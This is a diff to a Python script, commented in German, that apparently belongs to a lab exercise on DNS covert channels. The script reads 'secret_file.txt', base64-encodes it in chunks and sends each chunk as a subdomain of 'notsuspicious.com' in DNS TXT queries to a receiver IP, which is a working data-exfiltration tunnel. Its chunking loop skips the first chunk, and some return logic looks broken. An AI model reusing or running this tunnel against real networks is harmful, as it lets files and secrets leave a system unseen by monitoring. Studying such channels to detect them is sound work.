@@ -1,4 +1,5 @@
 import base64
+import hashlib
 import socket
 from time import sleep
 import dns.message
@@ -8,25 +9,33 @@ import dns.rdatatype
 import dns.rdataclass
 import dns.rdata
 
-
 def read_file(filename):
     secret_file = open(filename,"r")
     return(str(secret_file.read()))
 
 
-def dns_compose(text,domain):
-    return(str(base64.b64encode(text.encode('utf-8')))+domain)
+def dns_compose(text):
+    return base64.b64encode(text.encode('utf-8')).decode('utf-8')
 
-  
 
-def send_minimal_dns_request(server_ip, domain, port):
+def hash_string(input_string):
+    # Erstelle ein SHA-256 Hash-Objekt
+    sha256_hash = hashlib.sha256()
+
+    # Füge den String dem Hash-Objekt hinzu (muss zuerst in Bytes umgewandelt werden)
+    sha256_hash.update(input_string.encode('utf-8'))
+
+    # Gib den Hash als hexadezimale Darstellung zurück
+    return sha256_hash.hexdigest()
+
+def send_minimal_dns_request(server_ip, domain :str, port):
     # Stelle sicher, dass der Domainname absolut ist
     if not domain.endswith('.'):
         domain += '.'
 
     request = dns.message.make_query(domain, dns.rdatatype.TXT)
 
-    additional_data = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, "benutzerdefinierte Nachricht")
+    additional_data = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, hash_string(domain))
 
     # Resource Record Set (RRSet) für Additional Section
     rrset = dns.rrset.from_rdata(dns.name.from_text(domain), 300, additional_data)
@@ -44,7 +53,7 @@ def send_minimal_dns_request(server_ip, domain, port):
 
         except socket.timeout:
             print("No response received (Timeout)")
-
+    return True
 def print_records(response, record_type):
     records = []
 
@@ -61,25 +70,29 @@ def print_records(response, record_type):
     if records:
         print(f"{dns.rdatatype.to_text(record_type)} records found:")
         for record in records:
-            print(f"- {record}")
+                return record
     else:
         print(f"No {dns.rdatatype.to_text(record_type)} records found.")
+        return True
 
 
 
 if __name__ == "__main__":
     receiver_ip = "172.36.0.3"  # Ändere dies in die IP des Empfängers, falls notwendig
-    domain_base = "notsuspicious.com"
+    domain_base = ".notsuspicious.com"
     secret_text = read_file("secret_file.txt")
-    domain_name = dns_compose(secret_text,domain_base)
-    for i in range(1,(100+len(domain_name))//50):
-        sleep(5)
-        if len(domain_name)>=50*(i+1):
-            current_domain = domain_name[i*50:(i+1)*50]
-        elif len(domain_name)>=50*(i+2):
-            current_domain = domain_name[i*50:-1]
-        else:
-            print("ERROR:Index went past Domain Name length")
-            break
-        print(f"Sending DNS request {i}")  # Zähle die Anfragen mit
-        send_minimal_dns_request(receiver_ip, current_domain, 12345)
+    size = 30
+    for i in range(1,(size*2+len(secret_text))//size):
+        resp = True
+        while resp:
+            if len(secret_text)>=size*(i+1):
+                current_domain = dns_compose(secret_text[i*size:(i+1)*size])
+            elif len(secret_text)>=size*(i+2):
+                current_domain = dns_compose(secret_text[i*size:-1])
+            else:
+                print("ERROR:Index went past Domain Name length")
+                break
+            current_domain += domain_base
+            print(current_domain)
+            print(f"Sending DNS request {i}")  # Zähle die Anfragen mit
+            resp = send_minimal_dns_request(receiver_ip, str(current_domain), 12345)
